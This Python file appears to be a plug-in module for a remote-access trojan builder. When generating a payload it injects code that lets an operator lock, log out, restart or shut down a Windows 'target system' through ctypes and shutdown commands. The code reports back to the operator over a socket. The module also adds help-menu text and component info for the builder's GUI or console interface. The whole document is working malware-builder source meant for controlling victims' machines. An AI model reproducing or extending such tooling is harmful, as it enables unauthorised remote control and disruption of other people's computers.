# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('from ctypes import windll')
        config.import_statements.append('import os')
        config.functions.append('''
def system_stat(option):
    if option == 'lock':
        s.sendall('[*]Locking user...'.encode())
        windll.user32.LockWorkStation()
    elif option == 'logout':
        s.sendall('[*]Logging user out...'.encode())
        os.system('shutdown /l')
    elif option == 'restart':
        s.sendall('[*]System restarting...'.encode())
        os.system('shutdown /r /t 0')
    elif option == 'shutdown':
        s.sendall('[*]System shutting down...'.encode())
        os.system('shutdown /s /t 0')''')
        config.logics.append('''
            elif command in ('lock','logout','restart','shutdown'):
                system_stat(command)''')
        config.help_menu['lock'] = 'Allows you to gracefully lock the target system'
        config.help_menu['logout'] = 'Allows you to gracefully log the user out of the target system'
        config.help_menu['restart'] = 'Allows you to gracefully restart the target system'
        config.help_menu['shutdown'] = 'Allows you to gracefully shutdown the target system'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "System status changer component",
                "OS": "Windows",
                "Required Modules": "os, ctypes",
                "Commands": "lock, logout, restart, shutdown",
                "Description": "Allows you to gracefully lock, logout, restart or shutdown a computer"}
        elif interface == "CUI":
            print('\nName             : System status changer component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : os, ctypes' \
                  '\nCommands         : lock, logout, restart, shutdown' \
                  '\nDescription      : Allows you to gracefully lock, logout, restart or shutdown a computer\n')